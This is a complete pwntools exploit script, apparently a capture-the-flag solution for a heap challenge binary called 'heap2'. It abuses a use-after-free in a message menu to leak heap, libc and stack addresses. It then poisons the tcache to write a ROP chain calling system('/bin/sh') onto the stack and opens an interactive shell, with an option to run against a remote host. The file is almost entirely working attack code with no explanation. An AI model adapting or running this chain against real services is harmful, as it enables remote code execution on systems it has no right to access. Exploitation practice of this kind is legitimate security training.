#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('heap2')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def add_message(idx, data):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", data)

def delete_message(idx):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(idx).encode())

def edit_message(idx, data):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode())
    io.sendline(data)

def show_message(idx):
    io.sendlineafter(b":", b"4")
    io.sendlineafter(b":", str(idx).encode())
    io.recvuntil(b"Notification: ")
    data = io.recv(6).strip(b"\n")
    return data

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val 


def solve():

    add_message(0, b"asdf")
    add_message(1, b"asdf")
    delete_message(0)
    heap_base = u64(show_message(0).ljust(8, b"\x00")) << 12
    info("base: %#x", heap_base)

    for _ in range(7):    
        edit_message(0, b"A" * 9)
        delete_message(0)

    main_arena = u64(show_message(0).ljust(8, b"\x00")) 
    libc.address = main_arena - 0x21ace0
    info("libc base: %#x", libc.address)

    add_message(2, p64(libc.sym["environ"]))
    stack = u64(show_message(2).ljust(8, b"\x00")) - 0x120
    info("stack: %#x", stack)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    chain = flat(
        [
            pop_rdi,
            sh,
            pop_rdi + 1,
            system
        ]
    )

    edit_message(0, p64(stack))
    edit_message(2, chain)

    io.sendlineafter(b":", b"5")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

